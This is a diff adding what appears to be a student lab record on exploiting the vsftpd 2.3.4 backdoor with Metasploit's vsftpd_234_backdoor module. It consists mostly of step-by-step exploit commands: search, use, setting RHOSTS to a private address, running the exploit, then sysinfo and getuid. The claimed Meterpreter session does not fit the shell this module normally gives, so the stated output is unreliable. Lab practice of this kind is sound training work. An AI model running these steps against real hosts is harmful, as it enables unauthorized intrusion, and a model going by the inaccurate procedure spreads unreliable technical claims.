@@ -1,0 +1,24 @@
+Aim
+To exploit the vsftpd 2.3.4 backdoor vulnerability using Metasploit and establish a Meterpreter session.
+Introduction
+vsftpd 2.3.4 contains a backdoor vulnerability that allows remote command execution. Metasploit provides an
+exploit module to target this vulnerability.
+Procedure
+Step 1: Open Metasploit Console
+msfconsole
+Step 2: Search Exploit
+search vsftpd
+Step 3: Select Exploit Module
+use exploit/unix/ftp/vsftpd_234_backdoor
+Step 4: Set Target Host
+set RHOSTS 192.168.1.10
+Step 5: Run Exploit
+exploit
+Step 6: Execute Commands
+sysinfo
+getuid
+Output
+Meterpreter session opened
+System information displayed
+Result
+Thus, the vsftpd 2.3.4 vulnerability was exploited successfully using Metasploit
